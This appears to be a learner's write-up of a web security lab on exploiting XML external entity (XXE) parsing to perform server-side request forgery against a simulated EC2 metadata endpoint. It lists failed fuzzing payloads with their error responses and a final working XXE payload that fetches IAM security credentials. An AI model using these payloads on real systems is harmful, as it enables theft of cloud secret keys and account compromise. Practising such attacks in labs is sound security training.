# Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is <http://169.254.169.254/>. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

----

Fuzzing & Results

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mydoc [ <!ENTITY myent SYSTEM "http://fd00:ec2::254/latest/meta-data/" > ]>
<stockCheck><productId>&myent;</productId><storeId>1</storeId>
<product>
&myent;
</product>
</stockCheck>```

->
response
`"XML parser exited with error: java.net.MalformedURLException: Error at index 0 in: "ec2::254""`

----

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mydoc [ <!ENTITY myent SYSTEM "http://ec2%3a%3a254/latest/meta-data/" > ]>
<stockCheck><productId>1</productId><storeId>1</storeId>
<product>
&myent;
</product>
</stockCheck>
```

->
response

`"Entities are not allowed for security reasons"`

----

"http%3a//169.254.169.254/latest/meta-data/local-hostname/" > ]>

----
payload

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mydoc [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId>
<product>
</product>
</stockCheck>
```

this payload worked somehow , idk why the first one didn't :"
